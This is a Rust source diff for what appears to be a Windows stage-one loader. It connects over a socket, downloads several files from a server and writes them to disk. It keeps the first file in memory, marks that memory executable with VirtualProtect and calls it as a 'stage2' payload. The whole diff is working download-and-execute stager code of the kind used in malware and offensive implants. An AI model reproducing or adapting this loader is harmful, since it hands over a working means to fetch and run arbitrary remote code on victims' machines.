@@ -106,7 +106,10 @@ pub extern "C" fn main() -> u64 {
     }
     debug_print!("Hello from stage1");
 
-    let stage2_data = unsafe {
+    let mut stage2_len = 0;
+    let mut stage2_mem: *mut c_void = core::ptr::null_mut();
+
+    unsafe {
         let mut wsa_data: MaybeUninit<WSADATA> = MaybeUninit::uninit();
         (wsa_startup)((2 << 8) | 2, wsa_data.as_mut_ptr());
 
@@ -143,35 +146,6 @@ pub extern "C" fn main() -> u64 {
             core::ptr::null(),
         );
 
-        let mut bytes_read = 0u32;
-
-        let mut stage2_len_bytes = [0u8; 4];
-        if (ReadFile)(
-            socket as HANDLE,
-            stage2_len_bytes.as_mut_ptr() as *mut _,
-            core::mem::size_of_val(&stage2_len_bytes) as u32,
-            &mut bytes_read as *mut _,
-            core::ptr::null_mut(),
-        ) == 0
-        {
-            return STAGE1_READ_STAGE2_LEN_FAILED;
-        }
-
-        let stage2_len = u32::from_be_bytes(stage2_len_bytes) as usize;
-
-        let stage2_mem = (VirtualAlloc)(core::ptr::null(), stage2_len, 0x00001000, 0x4);
-        if (ReadFile)(
-            socket as HANDLE,
-            stage2_mem,
-            stage2_len as u32,
-            &mut bytes_read as *mut _,
-            core::ptr::null_mut(),
-        ) == 0
-            || bytes_read != stage2_len as u32
-        {
-            return STAGE1_READ_STAGE2_FAILED;
-        }
-
         // Download files until the server has no more
         loop {
             // NOTE:
@@ -184,6 +158,7 @@ pub extern "C" fn main() -> u64 {
 
             let mut file_info: MaybeUninit<DynamicFile> = MaybeUninit::uninit();
 
+            let mut bytes_read = 0u32;
             if (ReadFile)(
                 socket as HANDLE,
                 file_info.as_mut_ptr() as *mut _,
@@ -199,23 +174,24 @@ pub extern "C" fn main() -> u64 {
             let file_len = u32::from_be_bytes(file_info.file_len) as usize;
             let file_name_len = u32::from_be_bytes(file_info.name_len) as usize;
 
-            if file_len == 0 && file_name_len == 0 {
+            if file_len == 0 || file_name_len == 0 {
                 break;
             }
 
-            let mut file_name = [0u8; 10];
+            const MAX_FILE_NAME_LEN: usize = 20;
             // Make sure that the file name can fit into this buffer
-            if file_name_len >= file_name.len() {
+            if file_name_len >= MAX_FILE_NAME_LEN {
                 return STAGE1_READ_FILENAME_FAILED;
             }
+
+            let mut file_stem = MaybeUninit::<[u8; MAX_FILE_NAME_LEN]>::uninit();
 
             let mut remaining = file_name_len as isize;
             while remaining > 0 {
                 if (ReadFile)(
                     socket as HANDLE,
-                    file_name
-                        .as_mut_ptr()
-                        .offset(file_name_len as isize - remaining) as *mut _,
+                    (file_stem.as_mut_ptr() as *const u8).offset(file_name_len as isize - remaining)
+                        as *mut _,
                     remaining as u32,
                     &mut bytes_read as *mut _,
                     core::ptr::null_mut(),
@@ -259,14 +235,14 @@ pub extern "C" fn main() -> u64 {
             // Append the file stem to the filename
             (full_file_name.as_mut_ptr() as *mut u8)
                 .offset((written_count - 1) as isize)
-                .copy_from_nonoverlapping(file_name.as_ptr() as *const _, file_name_len);
+                .copy_from_nonoverlapping(file_stem.as_ptr() as *const _, file_name_len);
 
             (full_file_name.as_mut_ptr() as *mut u8)
                 .offset((written_count - 1) as isize + file_name_len as isize)
                 .write(0x0);
 
             // Create the output file
-            let exe_handle = (CreateFile)(
+            let file_handle = (CreateFile)(
                 full_file_name.as_ptr() as *const _, // Filename
                 GENERIC_WRITE,                       // Desired access
                 0,                                   // ShareMode
@@ -281,7 +257,7 @@ pub extern "C" fn main() -> u64 {
             let mut remaining = file_len as isize;
             while remaining > 0 {
                 (WriteFile)(
-                    exe_handle,
+                    file_handle,
                     file_mem as *const _,
                     file_len as u32,
                     &mut bytes_written as *mut _,
@@ -290,28 +266,38 @@ pub extern "C" fn main() -> u64 {
                 remaining -= bytes_written as isize;
             }
 
-            (VirtualFree)(file_mem, 0, 0x00008000);
-            (CloseHandle)(exe_handle);
+            if stage2_mem.is_null() {
+                stage2_mem = file_mem;
+                stage2_len = file_len;
+            } else {
+                (VirtualFree)(file_mem, 0, 0x00008000);
+            }
+
+            (CloseHandle)(file_handle);
         }
 
-        // Change the stage 2 payload's permissions to be executable
-        debug_print!("Changing stage2 permissions");
-        let mut old_flags = 0u32;
+        (CloseHandle)(socket as HANDLE);
+    }
+
+    // Change the stage 2 payload's permissions to be executable
+    debug_print!("Changing stage2 permissions");
+    let mut old_flags = 0u32;
+    unsafe {
         (VirtualProtect)(
             stage2_mem as *const _,
             stage2_len,
             0x20,
             &mut old_flags as *mut _,
         );
-
-        (CloseHandle)(socket as HANDLE);
-
-        stage2_mem
-    };
+    }
 
     debug_print!("Executing stage2");
 
-    let stage2: Stage2Fn = unsafe { core::mem::transmute(stage2_data) };
+    if stage2_mem.is_null() || stage2_len == 0 {
+        return STAGE1_READ_STAGE2_FAILED;
+    }
+
+    let stage2: Stage2Fn = unsafe { core::mem::transmute(stage2_mem) };
     stage2(core::ptr::null())
 }
 
